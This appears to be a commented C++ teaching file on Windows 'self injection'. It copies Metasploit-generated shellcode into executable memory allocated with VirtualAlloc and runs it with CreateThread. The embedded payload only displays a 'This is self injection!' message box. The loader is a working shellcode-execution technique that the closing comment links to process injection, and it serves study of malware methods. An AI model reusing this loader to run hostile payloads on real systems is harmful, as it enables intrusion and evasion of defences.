#include <iostream>
#include <stdio.h>
#include <Windows.h>


int main(int argc, char **argv)
{
  // Thanks metasploit for generating this shellcode
  unsigned char shellCode[]{"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
                            "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
                            "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
                            "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
                            "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
                            "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
                            "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
                            "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
                            "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
                            "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
                            "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
                            "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
                            "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                            "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
                            "\x52\xe8\x5f\xff\xff\xff\x68\x6f\x6e\x58\x20\x68\x65\x63"
                            "\x74\x69\x68\x2d\x49\x6e\x6a\x68\x53\x65\x6c\x66\x31\xdb"
                            "\x88\x5c\x24\x0e\x89\xe3\x68\x6f\x6e\x21\x58\x68\x65\x63"
                            "\x74\x69\x68\x20\x69\x6e\x6a\x68\x73\x65\x6c\x66\x68\x20"
                            "\x69\x73\x20\x68\x54\x68\x69\x73\x31\xc9\x88\x4c\x24\x17"
                            "\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
                            "\x55\x08"}; // Shellcode says "This is self injection!"

  LPVOID allocated_mem = VirtualAlloc(NULL, sizeof(shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
  // ^ This API takes four parameters:

  /*
  1, Base Address, but since we don't know the base address, we pass NULL and let the OS do it for us.

  2, How much memory we want to allocate, we just use the size of shellCode

  3, Allocation type, Microsoft documentation says that if we want to reserve and commit pages in one call, we should use MEM_COMMIT & MEM_RESERVE together

  3a, But what does MEM_COMMIT & MEM_RESERVE mean, and what does the | symbol do? When we want to allocate a page block of memory, we need to reserve it first (MEM_RESERVE), and after we reserve it, we need to commit it (MEM_COMMIT). Commiting just means that we're telling the OS that we want to read and write to this block of memory. The | symbol means that we're gonna add them up, since | is the OR operator.

  3b, MEM_COMMIT and MEM_RESERVE are enums, which is a data type defined by the user that map to numerical values. MEM_COMMIT and MEM_RESERVE map to "0x1000" and "0x2000" respectively. This means instead of typing "MEM_COMMIT | MEM_RESERVE", we can just type "0x1000 | 0x2000", or even just "0x3000".

  4, Protection flags for the memory page. Since we want to read, write, and execute code in this memory page, we use PAGE_EXECUTE_READWRITE. This maps to "0x40".


  If the virtual allocation runs successfully, it will return a void pointer (LPVOID) to the base address or the start address of the allocated memory page. LPVOID is short for 'Long Pointer to Void'. The type definition for LPVOID is void far, which is basically a void pointer. A void pointer is a pointer to an undefined data type.
  */

  if (allocated_mem == NULL)
  {
    printf("Failed to allocate memory, error: %d\n", GetLastError());
    return 1;
  }

  printf("shellCode written to allocated memory: 0x%p\n", allocated_mem);

  RtlCopyMemory(allocated_mem, shellCode, sizeof(shellCode));

  /*
    This is writing out shellcode to allocated memory.
    This has the same functionality of the memcpy function, but we're working with Windows so we're using a Windows specific function.

    It takes 3 parameters:

    1, The destination, where we're writing to, in our case it's the allocated memory.

    2, The source, where we're reading from, in our case it's the shellcode.

    3, The size of the copied data, in our case it's the size of the shellcode.

  */

  printf("shellCode is written to allocated memory!");

  HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

  /*
    This is creating a thread through the CreateThread API. It takes 6 parameters, but we're only going to care about the 3rd one, which is the entry point for the created thread.

    Threads are individual units of execution in a process, and they're sometimes referred to as lightweight processes because they share the same memory space and resources with the parent process, but they have their own program counter, stack, and registers, this lets them run concurently and preform tasks independently within the same process.

    Imagine we have a program that does 3 functions, and each function takes 1 second to run, the program will take 3 seconds of our valuable time. If we create 3 threads, one for each function, the program will only take 1 second to run. This is the basic idea of threading and concurrency.

    The 3rd parameter is set to the start address of our shellcode, and type-casted to 'LPTHREAD_START_ROUTINE'. What we're doing is telling the OS "Hey, this is the entry point/start address that we want to make a thread to start execution from" or "This is the start of the code that has to be ran when the thread is created". If the thread was created, the API will return a handle to the created thread.

    A handle is another void pointer to the created thread.
  */

  if (hThread == NULL)
  {
    printf("Failed to create thread, error: %d\n", GetLastError());
    return 1;
  }

  WaitForSingleObject(hThread, INFINITE);

  /*
    Since we don't want our program to quit before the shellcode is executed, we halt the execution using the 'WaitForSingleObject' API. It takes 2 parameters:

    1, The thread handle

    2, The time we want to wait until the program resumes execution, and since we want it to pause until the thread returns or finishes execution, we pass INFINITE.

  */

  CloseHandle(hThread);

  VirtualFree(allocated_mem, 0, MEM_RELEASE);

  /*
    After the shellcode is executed or returns, we want to free the allocated memory, so we use the VirtualFree API.
  */

  return 0;

  /*
    We injected our shellcode into memory, the same will be done with process injection, except that we'll be injecting into a process, and not our own memory we allocated/made.
  */
}